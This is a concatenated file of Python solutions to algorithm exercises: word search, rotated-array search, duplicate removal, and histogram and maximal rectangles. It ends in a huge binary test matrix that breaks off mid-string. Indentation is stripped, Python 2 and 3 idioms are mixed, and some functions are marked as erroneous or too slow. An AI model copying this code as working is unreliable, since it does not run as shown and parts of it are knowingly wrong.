from collections import defaultdict
dirs = [(0, -1), (0, 1), (1, 0), (-1, 0)]
class Solution:
def exist(self, board: List[List[str]], word: str) -> bool:
m, n = len(board), len(board[0])
visited = defaultdict(lambda: defaultdict(bool))
for i in range(m):
for j in range(n):
if board[i][j] == word[0]:
if self.dfs(board, visited, i, j, word, 1):
return True
return False
def dfs(self, board, visited, i, j, word, idx):
visited[i][j] = True
if idx >= len(word):
return True
m, n = len(board), len(board[0])
for di, dj in dirs:
I = i + di
J = j + dj
if 0 <= I < m and 0 <= J < n and not visited[I][J] and board[I][J] == word[idx]:
if self.dfs(board, visited, I, J, word, idx + 1):
return True
visited[i][j] = False
return False
if __name__ == "__main__":
assert Solution().exist([
["A","B","C","E"],
["S","F","E","S"],
["A","D","E","E"]
], "ABCESEEEFS") == True
class Solution:
def search_set(self, A, target):
A = list(set(A))
length = len(A)
start = 0
end = length-1
while start<=end:
mid = (start+end)/2
if A[mid]==target:
return True
if A[start]<A[mid]<A[end]:
if target>A[mid]:
start = mid+1
else:
end = mid-1
elif A[start]>A[mid] and A[mid]<A[end]:
if target>A[mid] and target<=A[end]:
start = mid+1
else:
end = mid-1
else:
if target<A[mid] and target>=A[start]:
end = mid-1
else:
start = mid+1
return False
def search(self, A, target):
length = len(A)
start = 0
end = length-1
while start<=end:
mid = (start+end)/2
if A[mid]==target:
return True
if A[start]==A[mid]:
start += 1
elif A[start]<A[mid]<=A[end]:
if target>A[mid]:
start = mid+1
else:
end = mid-1
elif A[start]>A[mid] and A[mid]<=A[end]:
if target>A[mid] and target<=A[end]:
start = mid+1
else:
end = mid-1
else:
if target<A[mid] and target>=A[start]:
end = mid-1
else:
start = mid+1
return False
if __name__=="__main__":
assert Solution().search([1,1,3,1], 3)==True
class Solution:
def removeDuplicates_complicated(self, A):
length = len(A)
if length<=2:
return length
closed_ptr = 0
duplicate_count = 0
open_ptr = closed_ptr+1
while open_ptr<length:
if A[closed_ptr]==A[open_ptr]:
if duplicate_count>=1:
try:
while A[closed_ptr]==A[open_ptr]:
open_ptr+=1
duplicate_count = 0
except IndexError:
break
else:
duplicate_count +=1
else:
duplicate_count = 0
A[closed_ptr+1] = A[open_ptr]
closed_ptr += 1
open_ptr += 1
return closed_ptr+1
def removeDuplicates(self, A):
length = len(A)
if length<=2:
return length
close_ptr = 0
duplicate_once = False
for open_ptr in range(close_ptr+1, length):
if A[close_ptr]!=A[open_ptr]:
duplicate_once = False
close_ptr += 1
A[close_ptr] = A[open_ptr]
elif not duplicate_once:
duplicate_once = True
close_ptr += 1
A[close_ptr] = A[open_ptr]
else:
continue
return close_ptr+1
if __name__=="__main__":
Solution().removeDuplicates([1, 1, 2, 2])
import sys
class Solution:
def largestRectangleArea(self, height):
if not height:
return 0
n = len(height)
gmax = -sys.maxint-1
inc_stack = []
for i in xrange(n):
while inc_stack and height[inc_stack[-1]] > height[i]:
last = inc_stack.pop()
if inc_stack:
area = height[last]*(i-(inc_stack[-1]+1))
else:
area = height[last]*i
gmax = max(gmax, area)
inc_stack.append(i)
i = n
while inc_stack:
last = inc_stack.pop()
if inc_stack:
area = height[last]*(i-(inc_stack[-1]+1))
else:
area = height[last]*i
gmax = max(gmax, area)
return gmax
def largestRectangleArea_TLE(self, height):
if not height:
return 0
max_area = -1<<32
for ind, val in enumerate(height):
min_h = val
max_area = max(max_area, val*1)
for j in xrange(ind, -1, -1):
min_h = min(min_h, height[j])
current_area = min_h*(ind-j+1)
max_area = max(max_area, current_area)
return max_area
def largestRectangleArea_complex(self, height):
if not height:
return 0
global_max = -1<<32
for ind, val in enumerate(height):
if ind+1<len(height) and val<=height[ind+1]:
continue
min_h = val
global_max = max(global_max, min_h*1)
for j in xrange(ind, -1, -1):
min_h = min(min_h, height[j])
current_area = min_h*(ind-j+1)
global_max = max(global_max, current_area)
return global_max
def largestRectangleArea_error(self, height):
if not height:
return 0
length = len(height)
global_max = -1<<32
inc_stack = []
i = 0
while i<length:
if not inc_stack or height[i]>=height[inc_stack[-1]]:
inc_stack.append(i)
i += 1
else:
last = inc_stack.pop()
if inc_stack:
area = height[last] * (i-last)
else:
area = height[last] * i
global_max = max(global_max, area)
while inc_stack:
last = inc_stack.pop()
if inc_stack:
area = height[last]*(i-last)
else:
area = height[last]*i
global_max = max(global_max, area)
return global_max
if __name__=="__main__":
height = [4, 2, 0, 3, 2, 5]
assert Solution().largestRectangleArea(height) == Solution().largestRectangleArea_complex(height)
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def deleteDuplicates(self, head):
dummy = ListNode(0)
dummy.next = head
pre = dummy
while pre.next:
cur = pre.next
if cur.next and cur.next.val==cur.val:
next_non_duplicate = cur.next
while next_non_duplicate and cur.val==next_non_duplicate.val:
next_non_duplicate = next_non_duplicate.next
pre.next = next_non_duplicate
else:
pre = pre.next
return dummy.next
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def deleteDuplicates(self, head):
if not head:
return head
closed_ptr = head
open_ptr = head.next
while open_ptr:
while open_ptr and closed_ptr.val==open_ptr.val:
open_ptr = open_ptr.next
closed_ptr.next = open_ptr
closed_ptr = closed_ptr.next
open_ptr = open_ptr.next if open_ptr else None
return head
if __name__=="__main__":
nodes = [ListNode(1) for _ in range(2)]
for i in range(len(nodes)-1):
nodes[i].next = nodes[i+1]
Solution().deleteDuplicates(nodes[0])
class Solution:
def maximalRectangle(self, matrix):
if not matrix or not matrix[0]:
return 0
global_max = -1<<32
m = len(matrix)
n = len(matrix[0])
dp_height = [[-1 for _ in xrange(n)] for _ in xrange(m)]
dp_height[0] = map(lambda x: int(x), matrix[0])
for i in xrange(1, m):
for j in xrange(n):
if matrix[i][j] == "1":
dp_height[i][j] = 1+dp_height[i-1][j]
else:
dp_height[i][j] = 0
for i in xrange(m):
inc_stack = []
j = 0
while j<=n:
if not inc_stack or j<n and dp_height[i][j]>=dp_height[i][inc_stack[-1]]:
inc_stack.append(j)
j += 1
else:
last = inc_stack.pop()
height = dp_height[i][last]
if inc_stack:
global_max = max(global_max, height*(j-(inc_stack[-1]+1)))
else:
global_max = max(global_max, height*j)
return global_max
def get_height(self, matrix, row, col):
height = 0
for i in xrange(row, -1, -1):
if matrix[row][col] == "0":
break
height += 1
return height
if __name__=="__main__":
assert Solution().maximalRectangle(["01", "01"])==2
assert Solution().maximalRectangle(["10001000001111110111111010111100111101001111001011111111101110110110011101101001110011101111001010110100110110111110101111011111110101111111111111111111111101110111111111000111100111111111011010111011","11010111100111111111111011110111111011101111111010101100110001100110101111101101111111010011111011111110111001110111010111111111011111110110011010111110101110111010101101101101110111111101111110100110","11010001100111011011111111111110111111010011011011111011111111110111111110111101111011111101101100111111001111101010111111011101110111011111001111111111111111101111110111111111111010101011111011111111","11111111011111110010110111001111111111111101111111111110100101111101110110001111100110101101111100111111110111001010110100011111111001010011100101011011011111111111110111111101001101110001110111110111","11011000010101101111011101011101101100111111101111111111111001010011011110110111110111111011100000001111111100011011101110110000000110001111111111111110111011011100000111111111110001111100111111111111","11111001101111101111111100111101111111111001011101111111111011111011110111111011110101111111111111111111010111111111111011111110110101111111111001110011010101111011111111111111011011100110111111101111","00111111011011111111100111110111011111111101101011111011110111100111111111111111111001111110000111111011011010111101110111111101111010111011011111110111101101110011111011111111110101111111011110011111","00101110111111011111110110001110111101111111111001111010010101101111010011101111111011011110110111001011001111100101110111111101000111101110111101111111100110011100111011111111011111110111111111110111","11111111011011011101111110111011110111011111111001101111111111011010111101110111111111111111111001000110111111001011011111010110111111101101100111110011110111111111011101110101111110101111111101101111","11101100010111111101111111101110110110111111101111111101111111110111001111000111110110111101111111011110111101101111101111101111010111011111011111101011101111110111111111111111110011111110111110111001","11110111111111001111111101011011101101111111100111111011111101011111111010110011111111111111111011010111111110111101110101111111011111111010011101111101011111110111100001110100111111110111011000011010","11111111101011110010101111101000111111011111101001010111111111110111010110101111101111111111111100101111111111011001101110101011001111111110011111111001111011111111011100111011111111111001110111010111","11111100101110111011110111111101111011111100111011011011111011111011111101000101101101111011111011101111011010100110011110011110011101101101110111111101101111110111110111110101111111100111111111111011","10111111011011000111111101111110001111111110111111111111111111111100111111110111011101111101101011011110010111111111111111101111101011111110111011011011111111111010001110111111110001111111111111111011","01001110100111011111001011011111111111100111110101111111111011110101111111011010110101111111110101010110011011111011100011111011111001101101011111101111011110111011101001101111111101100111111111111111","10111011111011011110111010111101111111011111111110111010011110111011111111111111111111111011111110111011110111111110110111110111011111101111111101011010001100100011101011101111111111111100110111110111","10111000101111111111111111110011010100110010101111101001111111110111111101111101100001110111111111111011110111111011111111110111111111111110111011100111110111111101111111111111111011111111011111111111","10101111111100111011111110111100111010111111110111010110111111111010001110101110111110101111111110111101011111110011000111111111111111111011101101111011011111111011111111101110111101101111111111101111","11111111111111001111111011011111111011000111111100000111101110101110011011111111110110111110101111110011111101110111111101111111110010111011111111101111110111111010011110111011111111111111111111100111","11100101111111111111110111111110111111111101101010111111011101011011111111101001111011111001100111111101011111111101111111011110111100111011111101011101111111111001010101010111111111111101111111111111","11100001111010011111110011001111011011110011110111101110101111111111011011110101111101101011011010111111111111111111111000111111110111011100111100111111101101101011111101110111111011100110110101011110","11011110110111110011011101001111111111101111000101111011111011010111111011111011111011111011111111111011110010111111111111111101111111100111111111101111111111111110111101111101011001110001010111110110","11111110110111111111110101101001111111111101110111100110110110101111110100111011101111111101111001111111110111111001111011111111101101111101111111100001110011111011011011111111111010001101110111111011","10111110111111110111111110111111111110111111011010111000011101011111111101101101111111101111111111101011111111110111111110101111111111111101111011110111111011111111110110111111011011111110110110110111","10111111001111111011110011011110101111111111111011111111111110001111111011101101111111101011001111100111111111111111111111111111101101010111111100011101011111111111010011111111011111111011111110111110","11101011111110111011111111111110110111111101111111111011111001111111111101011111111110011111011101010101111110001111111111101111011111101111110101010110010101111111101111111110111101101111000111111001","11111011101111101001000111011011111010101011111111111111011111110111111111011111111100001101101111111111111111111111101111111111100110111111111111011111111011101111111110111110111101111011101011110110","11111111101110110011011111110111010111111111110111111010111101101110101011111101110011001000110101011101111111010011111111111111011111111011110111111111011110111111010111011111101111110111011111111011","11010111110011110011111101011101111111011011111111111110011111110101101101111100110111111011010010010111001101111101111111011011011011110001111111110111110101101101101111111111011111101011111111111111","11001111100111111101011111000011111111111110111101010111011111101000111111101111110101111111011111111111111111101111111010101111110101110011111101010010011111100110001000111110001111101011111110010110","11111111111011011101011101001101011110111010111111111100000011111011110110110111111011101100111111111101110001110110011111111111111111110111111111111001111011111011111111001111011101111111110110011011","11011101111111111111111111101111111111100101111111111101111111110001101111110111110100101011111111111010111101101111111111011101111001111111111001110111110101110101111100111101110111111011111111111110","11111111111011111111101111110111111101010111111110000101011001110111111111111111111000111111100111111101101111111011011101111110111100110011101100101011100111111110111111011111111111001111101111111011","11111101111011110111111111001111100001111111010011111101100101111001110111111111111111110111110110110101111110111010010001101111101111111100110111111111000101111011011110111111111110111110111001101111","11001111011110111011011011000111110111110001111111110101101111111011110101110111111111111111111111000011111110111111111001111011101101111000101000111110111011101111111111111111110101011111101111111011","10111101001111011101111111011111110111101111110100111011111101111111101010111111111110111111100111111111110111101111110111111101111111000001111111110111010100111110010010111011111111111101111011011011","01111100001110111101111111110010111110110111011111111001111111011010011001111011111011010111011110111110011111111001101111111111111111110111111110100010011011111010101111111001111011110110011011111101","10110001111111101111111110101111001011111111111110011010110101111111111111011011011101101111101110101110110011111011101111111111111011001100111101100111101101010111111111111101011111011011111111001110","11111101110011111111011111111111111011111111011111111111111011111110001111111111111101111111110111111101101111011110111111111101011111111101011010110111111111111111011110100011111101011100111111111111","11111110111111110111011011111111111111111001111111111101111000111001011111101010110111111011010010111010111011001011010111111110011110100101111111111111111011111101101100111111000111011111010111110111","11111110111111101011001001101111111110101101011111111111111101111110100010111110101111111111110101111110111111000011111111001111111000010101111101111111011111110111110110100110111011001111111111111111","10111101111111100011100101111011110110001110100101111111001111111111111111101101011110110001111110111001110010111011011011101010011111111101010111010111101110111111101111111011101111111111110111111110","11101001011111111111001111111011111001101111011111011001110111011101011011111111111010111111111111111010100101011011111111111100101100011001101111111110111011100100100010101011110101110111111111111111","11111111111111010111111111011111010111010000101010110101110111111110111111110111110111111000111011011111101110110111110110111110111101110111111111111110111111011110111110000111110010110011111100111011","01111011111111101111111110110001011111011110101001111011011111111011110111111111101100101011101110111101111111011101111111001111111010111100111101010110110011111111111011110100101010011100111111111011","11111111111111111111110111011111110111101110111101001111110101111101101111111111111111111111011111001011111010001110011110111011111111111111011111111001110111111010111110111101011110101111110111110111","10011111110111101111111111111001001100101011111111111011101111101111111101111111010111001111011111011110101111011111111010111111011110111011110110101111100011101111110001111111111111111111111110010011","11100011111111111111010000111111010011111000101111111111101110111111100100111111110001110111011101111111101111011111111101110011101110001111111011111111111111011111110111110101111110111011110001111111","01100110001110010111111111111111110101111110111100111111110110101111110011111111110101111111111111111101110111011011101011110011101011101111111111011111000011111111111111111111111111111101111110111111","11111111111101110110011100111111111100101111011110110110111111111111101100111010110111101110101010110011111111111101011111101101111111101010110010111110101011111110011111111111101111101110011101101111","10101111111110101111111111110111111111011111110111110111011111011111110111111110011010111110001110111111111101011101111001111111111111111111011001111111011011111100110111111111111110111100111111111111","10101110011101111111101110001101111101111101110111011101101011110110111001110110011111001111111011100100111001001111111110111001111101000110001110101111101101111011111111111011011001111011111010111111","11111111111111101111010110011101111011111111111011010010011111001101010110011001100101100111011111011001101111101111111101000111110111011111101101111101101011101111110001111001100110010101011110111111","01111101101001111101111111111111111111110100111011010111011111111101111101111111011000111111111111110110111111110111111010111111111110111101101111101111111101011111101101111100111111011110111111101111","11001010011101111011111111111110011111110001101111110011110111111110111000010100111111111111011101111011011111111000111111111010101111011111110010001110111111011110111110001011111111110111011111010101","10111111100110111111101111110111111111011101000111101110101111101110111100100011101011101011111101100110110111111111101100111111110011011011010110110110110011011011110111011011001011110111111011111101","10110110111011111101111011111111111111110111110010101000111101110111111111101111111111100010111111111101111111111111111111101111101111011110011111111111101010110101101110011111111110001100101101011111","11010111010111111111110101111100101110111101011100011011011111111100011111110000111110111101010101101111111111011110011111011111111111111111011101011101101001101111111110101011110010111111011111111011","11111111111011111101111111101111100111010101111101011111111110110111011101111111111001110011011011110010110111111111110011110111100011001011101011111101110101101000110111111011111110110111011111111101","11101010111111101101111010110011111111111111011001100101101101110110111001111111011111011101110011011111111111111001101111111111101110111111111111111110101111011101111110011110111111101111101111011111","11000101100111111100101111001111111010111111101111111101111111110111111111001111111111100111010110111110111011010011111111110101111001111101011000111111011011110110110110011111111111111111100111101111","11111111111111111111111111110111111011001111110000110111110111111110111011101011011011111101011100110011111110111011100110111111011111110111101101111011111111111111101110110111001100010101011110011111","11111001011101101111111111001110111111011111111001011111111110101110111001111011111101111110100111111111000101111111110101111111111110010000111001101111111000111101111111111111011111101001011111101100","11110110111011011101111011011011011011011110011111111111111111011110111111111111111111101111111110111110011111111111111110011110111101001111011101100111111010101101111101100110111111111111101111110100","11111111111101111010011101001111011101100111011111101111111000101111111010011111111110110101110111011110111110111001110010011111111001011101011100101111111111110110111010101111111110111111001111111111","11111101111110111111111111011110111101011101111010111111111100111111110111001111111111101011011110111111111001111110110101001110111011101001111011011011111111110111011111110111011101111100111111111111","11111111011011111111111110101101011011111111011110111011111011101101111101001110110011100101111111111111111101111110010010101110111111011101110110111010010100111101001111110011011011010101111111101111","11011111101111111111111111111110111101111111001011111111001101111111111100110111110001101011110110111101100111011011101111100110100110010011111111011001111111111011011011111000111111111011111110111011","11111111101111110111111111001111111110101111110100111100100011101111111100111111101011001101000111100010001111101101011111110101111111011100010111111110111111110111110101110001110010011111111101011111","11111111111101111111011111101011011111011111110110111011111111111011111111101010011111101111001101011110011100101110110111111111011111111110111110111110011111011111110001101111111011110110100111111101","11011101011111101101101110011011100010111100101111111010101101111111100111111110011111111001100111111101011111110011111101111110011111111111110111101111110111111111100001101111111111011110011111011111","10111111011111000111101111101111111001001111111110111111100011111011011111001110010111111111011111110001110111111110111100101110101101001011111011111111111110111111011111001111011101011111111011111110","01111011111111110110011111110011111011001111111101101001111111111111111111010111111111101111111101010111011101111110111111111011010011111011111101101110111011111111010110010110101100111110111111111111","01111111111110111110111111001111111111101111111110101111110000111001111011111111111101111111001101000111111011111111110101000110110111010101111011111111101101111111011111110010111111101111101111110101","10000101110111101111111001001111111111100111111100111111011000111101111101111011011110111100111001110011111011111011101110111111101110101111111111111101011110110111011111110101111111011111100111111111","10111111001111111101110111110011111110010101111010111111110101111010011101111111111111000110100111111011101110111011111111011100111011101111100111100111111111101101101101110011111110101011101111001100","10110101111110111111110011111011011111111111111111011010101110001101111011000111110111111101111101111011011011111111010110101101010010100101111011110101110100001001111101101000111001111011011010111111","11111101111111111011101001111111111000110111010111101111101011110111011010101111111111111101111111111011111101010100111101111111101111010111011001011101110111111110111111110100101111111101111110011111","11001011011011111111001111111011111110110001110011101111111110111101111111111111101111101111111111111010111111011110110111111111111111111111110101110111111101011110111111111110111101100010101110111011","11110011111100000111010111011110000011011111111111011000101011111110011011111111111111111111010001010111110010111111111111110111101111001101010101111111111110110111011101101111111011100111111111111111","01111111111001011101000111111011100111111111111101101111110111111100101111101101011111111101011111101010101111111111101001001110000101110111000111111111101011011101011010111111111111101100111111111111","11011111111101011110011111110111111111010111011111111001110011111101111111111111111001001011100000011001111011111111010111011111111111111111100111111110001111111110111111101111111111111100111011111111","01100011111100001111001101111101011011110100110111011111111111011111100111101111111011111101111011101111001111111111111011111111001110111001111010011111011111000111111011111111101011111001111101110100","11111111111111101111111001001000111011111111001111111111101011011011011001101111111011111011111110111111101111010100111011111100111101111111111111101101011101101111111111111111011111111111001111101110","11111010111100111111101011011101111010101111111111111111001111111111111100111010101011111101111110111111110011001110111111111011110111111111011111101011111011101111101111110111101110110111111110110011","01000111100101101111110101001111110101111101111110110110111000111101111111101001111101111111111111111101111111111011111010101011111011111111111111101111100111011111011010101111111101111110011111111111","11111011111110111111101110101111111011010111111011101011111011101110111101010011011101011110011111110111011110110100101110110011111101111111111111111101011010111011111111111101110101110111101101001110","01111111011100101111101110111111111010010110111110110111111110110011111111100111111111101111111111111101111111110011111110111110001111110000111110011110101010011100111111110111110101111011011111111100","11101011110111011111111110111111111011110110111111011111101111111011101111110011111111100011111111101111000101011111111111011111111111011001101011110001111011111101101001111111010011111010111001111011","11111111111100011111101111111111101110110110011101111111111011011111101111110111101111110111111011111111001001111110011011111011111011111111001110101000111111101000110101101111111011011101100100111111","10110001111111111110111111101111111011111111111111101111111110100101011101011111011011110101111111111110111111111011111001101101111001001111111100011111101111101101111111011111111111110001111111011101","00111011111111110101011111011010111110101110111111001111010011111011000111111111011101110011110111111111110101111111010001111111001110011111011101111111100110110100001111011111101111111101101111111011","10011011011111100111111111001001001111010111011111011111111111111110011111111101001010101111111111111111101111111111110001111010111110110101111110101101101100111111110111111100111011111111011101011101","11111111011100010111111110110111011000101111110111101011111100111111111111111111101111101111111111000111111111111111010101011110010011111011011111110100100101101100111110111110001011011011110110011111","11111111111111110101001111101001111111111111111111011100110010100011101111110011111101111111101100010101111111111011111111101111111111111111111111111011111111111010101011001101111111110101011011111011","11110111010101101111111011111011110110111100110111111110110111110101111111111111011110111111111110111110101111110101010111110010011110101111011010111111111111111101111111110111111010101111111011001111","01101001111111100001110110100010111010101111011011010011111011001100111111100111011111111011111111101110101011111111111111011111011111111010111011011111011101100111011111011111111111010101111111010111","11111110101111100011111111110111110110101111111111110111101111111101110111111101110111110011110110101111111101111111101101111110110010101111111111111001111111111111110111111110011101010101111100111111","01011111011011011011110111111111011101101110010110111111101110001111111010111011010101001111111111101000001111111100100111111001111111111111011110010011111111111101110111111111101101111111001101110101","11110111100011111111101110111111101111111111111111101111001101111101111111101111110111111101110110101111111100111111100110111111110111101111111111111110111011011101111111101110101111111110011111011111","00110111111111100101111111111101111111111110111010111111011101111111011110111111111111110100001111111111111011111101110111101111100111011111111101110110111110110110111101111101011111110110111101111110","11111111110011010111111110111110111110111111111101011111110111011111100111000110110101010011111101001011111111001011111111101011111101111011111111111011101001111111111111111100111110111111011110111010","11110111111010111101111101010111111101110111101111101011001011101101111101111101111100100001111111011011111111111111111111011111011111001101111111111101101111110111111111110101111111011011110111111111","11111111111101011011110110111101111111111111110111001011100100111111111011101101001101001011111110110111011001111111111110100111111110011111110001111111101111011111110111111110101011111101111011111101","01001111111001111111101111101111111101111111111111101111110101111110011111110111011100111111010111111100011111111111111111111011110101101011111110110111111010111011011101111011111011110111110011111011","00011100100011111111111110101110111110111111110111111111011001110010001110011011110110111011111101101111001111110111110111111101111111111111111111111111111101111001110111101110101010001111111110111111","11011111100110111101111111111111111010000011111111011111101110111101111011111111011010111111110101101001111111111111011111000010110111111101111101001011011011111011010111011111011110111111111111001110","11101111111111101111010110111111010111011010101111111110111011011000101110110111111111110111110110110110111111011111010111111001010111100011111110011111011111111100111111011101110110111101111011010011","11011000110010100111001111111010111011010010000011111111111101111010111110100101111111001111111110111111111110001011110011111110101111110111111011000010111011011111011101111111111110110111110001111001","01110111011111011111101010110110111100111111101111111010011111111011111011101110111111111111100101111111111111111000011101001001111111110011111011011111011111001011010011111111111101111111111110111101","11110111110111001111111111111100101100111111111011111101010110110011010111111110101111111111111111111110011111101110011101111111100011011011111111101011000111011011111011001111010110111011111111001110","11111100111111010111111111111110111111110101110111011011111101110111011001111101101011111101111111111111111101111111010101111111110100011111110111011011111111110111111011111110010111111111110111001111","11111001101111111111011111111111111111101111011111110111101111111010010101101100011001111011101011111110110110101111100111111011111111100110101111110011111111111111010001011111110110011111110111101010","11111010111111111111111111100101010011010101111111101110011011010001101111110101011111111111110010110101110000111010111101001000001111011010011111111001001101111110111111111110001101101111101101110111","01011111111100110111010011110110101011111101110110111011110110100001111111111111110011110111001001111001111010111110110111111111111111110111111101110111111111111101011011100010111011110010111111011110","01011111111111111111011111111011111101111011111111001010101011111011110111011111111011010110111111111111101111110011011110111111110101111100011011010111111111111111111111111111111101010111110101111001","11101011100010010110011011111111111111111101101111111111011101110110111111111011000111110111110111111111101110111111110111001011101011101110111101011111111111010111111110111111011110011111111101001111","11111011101111101100011111001111111011111011111110111010111111110111011111111101111011111110011011111101010010011101101110111111111111111101101111111111111111111111111111011111011111111110110111111111","10111111101111110111011111111111111111101111111110111111111010111111100011011100011110011111111111111110110110011110111101110011101011110111110111111111111110100101011111111110011111110111111101011111","11110010111011111011101111110111101100111110111111111111001011111111011111110111111111111011111111111110101101111011110011011111111100110110111111011111110111111111101111111111110101111101111011111111","11111111101111111111010111101011111111011111010111111110110110001011111111111100011001011001000101101110111111110110111111111111111011011110101110111111110111111110111111111111111111111011110001111111","10111011111010110111011110101111101111111111111101111111101011011111101011111111110101111111111011111110110110111111111110111011111011011010100111111101111111011110110111111111100111011111011110111111","01010111111111111110111111111011111101101110111101110001110011011110110101110010111111001100111101111101110111110111000110101111110110011111110111111100111111110111111111000110111111011111111111101110","11010110101010111101110010001111111111101101111011110111111110111111101001111011101111111001011110111110011111111000011111011111011101101110111111011111110111001111011101011111111111111100001101101001","11011101110101101111111101111100111011110100111111011110111111110011111111111011111111010111110111010111111101111110111110111110110111011111110111111100100011011011111111110111110110110101101101111101","11011111111111111110111111110111110110011111110101101101101110001011011110011011111111111111011110110111111110111111111111111110111111111111111111101111111111110101011000101101101111010111111001101001","11011111111111111101111111110111111111001101101010101111111111100111111110101101110110111110110111111101110111111100100111001001110111111111011111001111011110111111101110111111111110111010011101110111","11110010111111011111011001101111100110111100101111111111010111011100111011011111110000011011111101111110111110111011110111010111111111111110111111111111111001111011010110110111111111110110111111011011","01110101111010110111011111111011110110111110010011110111110111111111111110001110101110001011111110110111111111111100110111101111111111101111011100011111111111011010110101011011100101111111111110111001","11111111110111110111001101111110111111010111000111111110111011111111001011111111111111100111111111111111110101111101011000101011101111010001001111101111111011111111010011011110110110011110101110111110","11111010111111011111111011101110111101110111110101110011101101111001111101110100011101011111111111101011111111011110011100110111010101110111111010011101111110111111111100111001101111111100011001110101","11111111111101011011111110001011110111101111110011101111111101011010010110111101011111101111111111101011001011101111011111101101101100011110010111111111111111101111111101111010111111111111001111110111","11101111110100011111101111111111101101111111101110111111110111000111101101011110101010100111111111101111011111111101111111110111111111110111011111111111111110111110010011110110101110101110110111110111","01111111011111111111111110111111110111110010111110111111101110011110101001011101101111111111110001011111011011111001111111100101100011010101110100111111001011111111110111011011110101011100111111100011","11111010111111010110001111111110011011001111111110010101111110000101110001111010011011010111110100111111111110111111111101011011110111011111111010111101001101110111110111111100111111011110110111011111","00111110011111101001111101111101111011011101011111111111111111111110111111110011111111111111011111001111110111111010111111110111111111101110111111001110101110111110111111010111101111001100111101011110","01110111110010111010110110111111101111111111111111111101111111110101111011011101110100111111111110111111111110011111110111011101111001010111101101101111111111111111010011111101111101110011010111111101","01111111111111111111010111111111110011111101111111111100011101111011110110111011001111111111111000111101111111011110100111111111111011111111111001111101111011111111111110111101111010111010111111111111","11110110110111111011100111011010101111101110101101111101011010111111001111101001111111111110111001101111011111111101011110111110011101101011111111111111111110111111111110011110111110101111010101111101","10011111111111001110101101011000101011111110111111111111111110111000111111110111011110111111101001110101111111110011110011111011111111101111000000111111101100111010111111111011100011111011011110011011","11010101110111111111101011111110111111111011111111101101011111111010111110101001111001101111110111101010011110111111111111111111111110110010011110111010111110111001101100111011001101100111100100000010","01111011011001000110011111011101111010111011111111011111111101011111111111111011111111001011110111111110111011111101111111110111111110111011110111011111111111000111011110111110111011111110010111111111","11001111101111101101010101111111101111101111010111111101111101111011111100101111000111100110111110001111111011111110011101110110111100011010111111101111111110111111011110101111111111101110100111111011","00110111010111111010011011011101111101110111010011011001101111111110111100111111111111101110001011011111111100111111101111111011100111111111101110110111111011111111111011111110011011111011111111111101","11100000011101110111110111110101111011111110111101011111110110001110111101110110010111011011011111111111000011111010110111100111111111010111111010101011101110111000011111111011110011111011110011011111","01111111111111111011111110111011101010111111011111111110111110100000011111010111110110111011011111111011110101111101111111111011111110011011111111101110011111010111110011111010000111111100001011110111","10100000011111111101111111011101111111011111111101111100111111111111110101000111101101110000111110111111011111100110111111111011001111011111111001111111111111111011011111111111011110111101011111110111","01101010101101111111111110110110010011010100111101111101111011011011010010101111110101101101101011110111111111011111101011111110011110111101101111111111111011011111110111110001110111011111101111111110","11111110110110011111101111101101111011000011011011001110000111110010111001111111110001011011100100110110011011111111111111111111111111111011101111010111010111011011101111111110001011010001110011011100","01111111111101101011011111100101111011110010110111111110111011110111111101111111111011100101110111111111101111101111111011110101111110011110011101101111101111101110111111111001111101010111101011011110","11111111111011111111111110111111101111011111001111110001011010110111011000011110101101111101110111010110111011011111101111111111111111111110111111111111111111111101111000101111101011110101110010111111","00110111111011111111011111011011010011110111101111111011110111011010111100111111101100111110111111101110111110100110110110111111111101111011110111111111111111111111011100111110101011001101111100100010","01111011111111111011110111111110111110111110011111111110101111111111110101111011111010010001010101101111101011001100111110111101011111110110111111111110011111111010011001111111111111111011110010111101","01101111111111111011111111110111111100110111111111011111111111111111110111111111111111100111101011111111011110110011111110111110111101101000011110110101110011011110110010011110011001111011101110111111","11011001111111111100101101011111111111111001110110010110101110001111011111111110111111110111111111110111111111010111101111111111111111101100100111111110111100111011111111101111110011110010011110111111","11111011110101101111111110111110010111100110110111110011011110011000111110111110001001101101100110001110111011011111111111110111101110101001100111110111011010111111111111001101111110111100111111111111","11101101111111111010101111111111101011111110110001110011110111001110111101111101111111011110110100111111111101011100110011011111111100011101100110101101001111111010011111011011011101000011110111111110","11111011111111111111101110010111000100111110111111011111111101001111111111011110011110101011011101111001111111111011101111110111011101011001011101100011111111111001101111001101111111111011111101111011","01110111000111101101110101111111010111111101110010101111111111011011111111111111101101001111111101110101011111111011111110111111101111110111110111011111101111011110111101111111111111101111101111001111","10111110011111110110000111111011111010011110011111011000111111111011011111111111111111010111110111101011111111101111101111111111001100111111001101111011110111111001011111111101011011111111010110111001","11111111011111101111110111011111101111111100101111110011110101111111111111011000111110011011111101101011011100111011011111111110101101001111011011111111001111111110111110101011101111111011010111011101","11111010011000111111110111111111110011100110111111011011101011111110010000011011111111101111110111111111111111111110100111011011010111111111110111111111011111110101111100111111111110011111111101110110","11011011111011111010101111111111111111110111111011111111110101111111111100110111101011111110011111111111100111111111111110111111101011101111001111111001111111101111110101101001010111110111011111000010","11111001110011111101111111111111100111111111011111111101111001111111111111111101110110111111011110001111111111011111110011010111101111110111011111011010011001111110111111111011111111110111101111101111","10111111111011111101111101111101110111011011111111110110010110011101101100010111010011011101101101111101111100111011101110110111110111111111111111111111110001011111110011101111111101100011111011111111","00111111110101101111100101101011111011110010101110101101111111111101011010010011111111111101011100100110111111111011111111011111111111100111111111111101110011101111111111111111011110111111111111111101","11111101011101101011011111010011111111011010111100001111111101111101010111111101101111011011111111011001111111111111001111011111011101011111111110110110011111011111111110111111111111111110111111111011","01011101111101011110110010111111110111111001101111101001011111111110001101111110111111111111111111111111111011111101110110111111101010101001111001110111111110100101111111110111011010100011111011111111","11111111111010110100110011101001111000101101111111111011101111111111011101111011111111011101111111111001111011110111110111011111111011101111011010101110011010111011111101111111111110111011011111010100","11111111100011111011110110111110110111101101111111110111111110101010111001110101111111011110100111111011110111011111110001101110111111111111111111110110101110111101101101111111100111110010010001111111","11111101101101011101011011110111111101011101111011110111111111110010111010110111001011111110000011111001011100011110111110110111110010111100100111111110101111001001010101101100011001111111011111011011","11110110101111111011010110110011100111101111111101010011010011111100010111101011110111110101110111111111111111111011111110101110111111011011111011111111111001101011010111111111110111110111101100100101","01111110111100001111010011110110011111111111111111011011111111101010001111111111011111101111001111111111110001101111110111111111111110111111011111010111111111011111101011111111111101011101111011110101","11101101111111110101011101111101111011010111011001111110011111101111010001101101011100101111111011